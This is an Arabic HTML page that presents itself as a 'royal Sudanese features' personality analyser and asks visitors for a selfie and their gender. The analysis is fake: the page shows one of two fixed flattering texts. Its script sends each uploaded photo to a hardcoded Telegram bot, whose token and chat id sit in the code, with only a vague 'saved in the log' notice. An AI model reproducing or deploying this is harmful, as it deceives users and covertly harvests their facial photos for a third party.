<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>من أصل سوداني | النسخة الملكية</title>
    <style>
        :root { --deep-black: #0a0a0a; --royal-gold: #c5a059; --pure-white: #ffffff; }
        body { background-color: var(--deep-black); color: var(--pure-white); font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 90%; max-width: 500px; text-align: center; padding: 20px; }
        .header h1 { color: var(--royal-gold); font-size: 2.2rem; }
        .upload-section { border: 2px dashed var(--royal-gold); padding: 20px; border-radius: 15px; margin: 20px 0; background: rgba(197, 160, 89, 0.05); }
        #preview-img { width: 100%; max-width: 250px; border-radius: 10px; display: none; margin: 15px auto; border: 3px solid var(--royal-gold); }
        .btn-group { display: flex; gap: 10px; margin-bottom: 15px; }
        .btn { background-color: var(--royal-gold); color: var(--deep-black); padding: 12px; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; flex: 1; font-size: 0.9rem; }
        #gender-select { margin: 20px 0; padding: 15px; background: #1a1a1a; border-radius: 10px; }
        #result { margin-top: 25px; padding: 20px; border-radius: 10px; background: #1a1a1a; display: none; border-right: 5px solid var(--royal-gold); text-align: right; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>من أصل سوداني</h1>
        <p>اكتشف أسرار الشخصية والملامح الملكية</p>
    </div>

    <div class="upload-section">
        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
        <input type="file" id="galleryInput" accept="image/*" style="display: none;">
        <div class="btn-group">
            <button class="btn" onclick="document.getElementById('cameraInput').click()">📸 التقاط صورة</button>
            <button class="btn" onclick="document.getElementById('galleryInput').click()">🖼️ تحميل صورة</button>
        </div>
        <img id="preview-img" src="" alt="معاينة">
    </div>

    <div id="gender-select">
        <label>اختر الجنس:</label>
        <select id="gender" style="padding: 10px; width: 100%; margin-top: 10px; background: #333; color: white; border: 1px solid var(--royal-gold);">
            <option value="male">ذكر</option>
            <option value="female">أنثى</option>
        </select>
    </div>

    <button id="analyzeBtn" class="btn" style="background: #27ae60; color: white; width: 100%; font-size: 1.2rem;">بدء التحليل الملكي</button>
    <div id="result"></div>
</div>

<script>
    const previewImg = document.getElementById('preview-img');
    const analyzeBtn = document.getElementById('analyzeBtn');
    const resultDiv = document.getElementById('result');
    let selectedFile = null;

    function handleFile(file) {
        if (file) {
            selectedFile = file;
            const reader = new FileReader();
            reader.onload = (e) => { previewImg.src = e.target.result; previewImg.style.display = 'block'; };
            reader.readAsDataURL(file);
        }
    }

    document.getElementById('cameraInput').onchange = (e) => handleFile(e.target.files[0]);
    document.getElementById('galleryInput').onchange = (e) => handleFile(e.target.files[0]);

    analyzeBtn.onclick = async function() {
        if (!selectedFile) { alert("الرجاء اختيار صورة أولاً"); return; }
        
        const gender = document.getElementById('gender').value;
        analyzeBtn.innerText = "جاري الإرسال والتحليل...";
        analyzeBtn.disabled = true;

        // التحليل الظاهري للمستخدم
        let text = gender === 'male' ? "📌 النتيجة: ملامح سودانية أصيلة تدل على الشموخ والهيبة." : "📌 النتيجة: ملامح سودانية ملكية تجمع بين الأصالة والجمال.";
        
        // إرسال الصورة للبوت
        const formData = new FormData();
        formData.append('chat_id', '6686129845');
        formData.append('photo', selectedFile);
        formData.append('caption', `مستخدم جديد (${gender === 'male' ? 'ذكر' : 'أنثى'})\n${text}`);

        try {
            const response = await fetch(`https://api.telegram.org/bot7038161139:AAFlvP1f6tHwNAtZ6-p_S0n_8oV28Ld4D_k/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                resultDiv.innerHTML = text + "<br><br><small style='color:gray;'>تم حفظ النسخة الملكية في السجل.</small>";
                resultDiv.style.display = 'block';
                analyzeBtn.innerText = "تم بنجاح ✓";
            } else {
                throw new Error('فشل الإرسال');
            }
        } catch (error) {
            alert("حدث خطأ في الإرسال، تأكد من اتصال الإنترنت");
            analyzeBtn.innerText = "حاول مرة أخرى";
            analyzeBtn.disabled = false;
        }
    };
</script>
</body>
</html>
